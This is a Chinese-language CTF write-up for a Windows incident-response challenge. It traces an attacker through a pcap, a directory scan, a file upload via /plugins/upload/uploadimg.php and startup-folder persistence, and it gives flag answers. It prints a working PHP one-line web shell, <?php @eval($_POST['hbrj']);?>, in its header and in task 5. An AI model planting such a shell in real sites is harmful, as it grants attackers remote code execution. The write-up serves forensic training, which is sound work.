---
title: 【CTF】暗魂CTF平台 Windows 应急响应 writeup
contest: 暗魂CTF
year: 2024
difficulty: easy
vuln_type: misc_unknown
tags: [incident-response, wireshark-HTTP, pcap-analysis, dirscan, robots.txt, php-study, web-shell, MD5-hash, startup-persistence]
attack_chain: 任务1 wireshark 桌面文件筛 HTTP 192.168.192.1 ↔ 192.168.192.132 攻击者 IP → MD5/任务2 目录扫描 / 任务3 robots.txt 内 flag{hbrj6666666666666666}/任务4 上传路径 /plugins/upload/uploadimg.php?fp=upimg 一句话木马/任务5 木马内容 <?php @eval($_POST['hbrj']);?> 启动项 C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup + C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
key_payload: 攻击者 IP MD5 = 6729fb3ef240c05a7037797ba7a97fcf  一句话木马 = <?php @eval($_POST['hbrj']);?>
one_liner: 暗魂 CTF Windows 应急响应 5 题 WP，覆盖 wireshark HTTP 分析 + 目录扫描 + 上传木马 + 启动项持久化。
lesson: 应急响应三件套：日志分析（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项检查；C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup 和 C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp 是 Windows 启动项两个常见位置。
quality: medium
---

# 【CTF】暗魂CTF平台 Windows 应急响应 writeup

## 题目背景
A 集团应用服务器被黑客入侵，Web 应用被上传恶意软件，系统文件被破坏。需要追踪攻击来源、分析攻击行为、发现漏洞、修复漏洞。

## 任务1: 攻击者 IP 的 MD5
- 桌面有 wireshark 文件，过滤 HTTP 流量
- 查看发现 192.168.192.1 ↔ 192.168.192.132 通信
- 右键追踪确认 192.168.192.132 是目标服务器
- 攻击者 IP: 192.168.192.1
- MD5: `6729fb3ef240c05a7037797ba7a97fcf`

## 任务2: 攻击者最先使用的攻击
- 数据包分析，一直在 GET 诡异路径
- 看起来是对目录进行扫描
- 答案：目录扫描攻击

## 任务3: robots.txt 内容
- 找 phpstudy 等网站根目录
- 或 C 盘根目录搜索 `robots.txt`
- 答案：`flag{hbrj6666666666666666}`

## 任务4: 上传文件路径
- 筛选 HTTP 流，目录扫描完成后开始上传
- 路径：`/plugins/upload/uploadimg.php?fp=upimg`
- 上传了一句话木马

## 任务5: 后门文件内容 + 启动项
- 一句话木马：`<?php @eval($_POST['hbrj']);?>`
- 启动项位置：
  - `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
  - `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

## 经验提炼
- 应急响应三件套：日志（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项
- C 盘根目录搜索 `robots.txt` 是常见快速定位
- Windows 启动项两个常见位置：User Startup + ProgramData Startup
- 目录扫描特征：大量 GET 不同 URL 且响应 404
- 一句话木马 `@eval($_POST[...])` 是国内最常见 WebShell
- 攻击 IP → MD5 是 CTF 应急响应常见输出格式
